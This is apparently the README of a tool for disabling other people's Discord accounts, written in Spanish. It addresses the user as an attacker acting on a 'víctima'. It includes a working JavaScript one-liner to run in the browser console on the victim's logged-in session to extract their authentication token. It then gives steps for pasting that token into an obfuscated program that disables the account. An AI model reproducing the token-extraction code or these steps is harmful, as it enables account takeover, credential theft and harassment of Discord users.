# Discord Account Disabler
Esta es una herramienta para deshabilitar cuentas de discord con su token

## ShowCase

![img1](https://cdn.discordapp.com/attachments/892133351580905542/893843362988298290/unknown.png)

## Info

- Con esta herramienta puedes deshabilitar cuentas de discord sólo poniendo su token
- El código está ofuscado para que los skiddies no me lo roben.

### Cómo conseguir el token de una cuenta?
Estando dentro de la cuenta de la víctima presionaremos **F12** e introducimos este código

`var req=webpackJsonp.push([[],{extra_id:(e,r,t)=>e.exports=t},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let r=req.c[e].exports;if(r&&r.__esModule&&r.default)for(let e in r.default)"getToken"===e&&console.log(r.default.getToken())}`

Y copiamos el texto que nos manda la consola (Éste será el token).

### Uso
1. Abre la consola y escribe `pip install -r requirements.txt` para instalar los módulos necesarios.
2. Abrimos el programa.
3. Presionamos "Enter".
4. Pegamos el token de la víctima.
5. Comprobamos que la información del token sea correcta.
6. Presiona "Enter" de nuevo para deshabilitar su cuenta.
